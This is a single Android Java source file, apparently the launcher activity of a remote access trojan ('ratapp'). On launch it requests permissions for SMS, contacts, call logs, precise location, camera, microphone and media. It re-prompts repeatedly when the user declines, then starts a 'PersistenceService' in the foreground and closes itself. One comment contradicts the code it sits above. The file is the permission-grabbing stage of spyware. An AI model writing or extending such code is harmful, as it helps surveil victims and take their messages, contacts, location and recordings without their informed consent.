package com.ratio.ratapp;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int REQ = 42;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        List<String> want = new ArrayList<>();
        // data lanes — always
        want.add(Manifest.permission.READ_SMS);
        want.add(Manifest.permission.READ_CONTACTS);
        want.add(Manifest.permission.READ_CALL_LOG);
        want.add(Manifest.permission.ACCESS_FINE_LOCATION);
        // hardware lanes — always ask, not just old SDK
        want.add(Manifest.permission.CAMERA);
        want.add(Manifest.permission.RECORD_AUDIO);
        // notification lane for persistent service on 33+
        if (Build.VERSION.SDK_INT >= 33) want.add(Manifest.permission.POST_NOTIFICATIONS);
        // storage/media by SDK
        if (Build.VERSION.SDK_INT <= 32) {
            want.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            want.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        } else if (Build.VERSION.SDK_INT == 33) {
            want.add(Manifest.permission.READ_MEDIA_IMAGES);
            want.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            want.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED);
        }

        List<String> missing = new ArrayList<>();
        for (String p : want) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) missing.add(p);
        }
        if (!missing.isEmpty()) {
            requestPermissions(missing.toArray(new String[0]), REQ);
            return;
        }
        bootService();
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] granted) {
        Toast.makeText(this, "agent started", Toast.LENGTH_SHORT).show();
        // walk any the user skipped — os soft-declined some lanes
        List<String> still = new ArrayList<>();
        for (String p : perms) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) still.add(p);
        }
        if (!still.isEmpty() && rc == REQ + 1) {
            // second pass done; proceed with what we have
            requestPermissions(still.toArray(new String[0]), REQ + 2);
            return;
        }
        if (!still.isEmpty()) {
            requestPermissions(still.toArray(new String[0]), REQ + 1);
            return;
        }
        bootService();
    }

    private void bootService() {
        Intent s = new Intent(this, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
        else startService(s);
        finish();
    }
}
